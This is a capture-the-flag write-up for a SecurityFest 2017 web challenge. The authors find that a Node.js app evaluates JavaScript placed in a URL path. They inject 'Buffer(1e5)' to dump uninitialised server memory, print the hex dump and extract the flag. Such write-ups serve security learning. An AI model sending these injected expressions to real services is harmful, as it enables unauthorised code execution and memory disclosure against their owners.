---
layout: post
title: "SecurityFest 2017: A temple jest (Web 200)"
author: verr, eth7
categories: writeup
tags: [cat/web, tool/python, lang/javascript, tech/nodejs]
---

* **Category:** Web
* **Points:** 200
* **Solves:** tbd
* **Description:**

> The target are setting up their intranet communication service. Hack it before they are done! 
> http://alieni.se:3003/

## Write-up

The main page of the challenge displays a *under construction* page with an image loaded from GitHub, no hidden info in the source code, no `robots.txt`.  The HTTP header `X-Powered-By` set to `Express` ([Express.js](https://expressjs.com/)) tells us that we are dealing with a `Node.js` app.

Clicking on the *under construction* sign leads us to `http://alieni.se:3003/render/404`, displaying:

> 404 is under construction...

We get curious and change the url to `http://alieni.se:3003/render/1337`, displaying:

> 1337 is under construction...

Aha, nice! Let us try `http://alieni.se:3003/render/hello` ...

> timeout

Crap. Okay, but how about `http://alieni.se:3003/render/new%20Date()` ... ?

> Wed May 31 2017 22:41:27 GMT+0000 (UTC) is under construction...

Now the solution is obvious, but we struggle to manage to inject interesting code.

After some research, we learn that in Node.js [`Buffer` knows everything](https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md), which allows us to dump memory content. Everything? Well, let's try with a sufficiently large one: `http://alieni.se:3003/render/Buffer(1e5)`

```
│000001e0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 |                |
│000001f0 00 00 00 00 6b 5f 53 63-68 6d 33 6d 30 72 79 5f |    k_Schm3m0ry_|
│00000200 6c 33 34 6b 7d 2d 2d 2d-53 43 54 46 7b 6d 33 6d |l34k}---SCTF{m3m|
│00000210 30 72 79 5f 6c 33 34 6b-00 00 00 00 00 00 00 00 |0ry_l34k        |
│00000220 72 79 5f 6c 33 34 6b 7d-2d 2d 2d 53 43 54 46 7b |ry_l34k}---SCTF{|
│00000230 00 00 00 00 00 00 00 00-33 34 6b 5f 53 63 68 6d |        34k_Schm|
│00000240 33 6d 30 72 79 5f 6c 33-00 00 00 00 00 00 00 00 |3m0ry_l3        |
│00000250 54 46 7b 6d 33 6d 30 72-79 5f 6c 33 34 6b 5f 53 |TF{m3m0ry_l34k_S|
│00000260 00 00 00 00 00 00 00 00-5f 6c 33 34 6b 7d 2d 2d |        _l34k}--|
│00000270 2d 53 43 54 46 7b 6d 33-00 00 00 00 00 00 00 00 |-SCTF{m3        |
│00000280 6b 5f 53 63 68 6d 33 6d-30 72 79 5f 6c 33 34 6b |k_Schm3m0ry_l34k|
│00000290 00 00 00 00 00 00 00 00-7b 6d 33 6d 30 72 79 5f |        {m3m0ry_|
│000002a0 6c 33 34 6b 5f 53 63 68-00 00 00 00 00 00 00 00 |l34k_Sch        |
│000002b0 33 34 6b 7d 2d 2d 2d 53-43 54 46 7b 6d 33 6d 30 |34k}---SCTF{m3m0|
│000002c0 00 00 00 00 00 00 00 00-53 63 68 6d 33 6d 30 72 |        Schm3m0r|
│000002d0 79 5f 6c 33 34 6b 7d 2d-2d 2d 53 43 54 46 7b 6d |y_l34k}---SCTF{m|
│000002e0 33 6d 30 72 79 5f 6c 33-34 6b 5f 53 63 68 6d 33 |3m0ry_l34k_Schm3|
│000002f0 6d 30 72 79 5f 6c 33 34-ef bf bd 2a ef bf bd 03 |m0ry_l34???*????|
│00000300 00 00 00 00 08 2b ef bf-bd 03 00 00 00 00 00 00 |    ?+????      |
│00000310 00 00 00 00 00 00 ef bf-bd 3a 00 00 00 72 79 5f |      ???:   ry_|
│00000320 08 2c ef bf bd 03 00 00-00 00 ef bf bd 2b ef bf |?,????    ???+??|
│00000330 bd 03 00 00 00 00 00 00-00 00 00 00 00 00 ef bf |??            ??|
│00000340 bd 3a 00 00 00 33 6d 30-72 79 5f 6c 33 34 6b 7d |?:   3m0ry_l34k}|
│00000350 2d 2d 2d 53 43 54 46 7b-6d 33 6d 30 72 79 5f 6c |---SCTF{m3m0ry_l|
│00000360 33 34 6b 5f 53 63 68 6d-33 6d 30 72 79 5f 6c 33 |34k_Schm3m0ry_l3|
│00000370 34 6b 7d 20 25 26 67 74-3b 00 00 ef bf bd 3f 47 |4k} %&gt;  ????G|
│00000380 01 00 00 00 00 ef bf bd-ef bf bd ef bf bd 03 00 |?    ?????????? |
│00000390 00 00 00 70 61 74 68 00-00 00 00 ef bf bd 3f 47 |   path    ????G|
```

With the help of `strings`, we extract the flag:

`SCTF{m3m0ry_l34k_Schm3m0ry_l34k}`




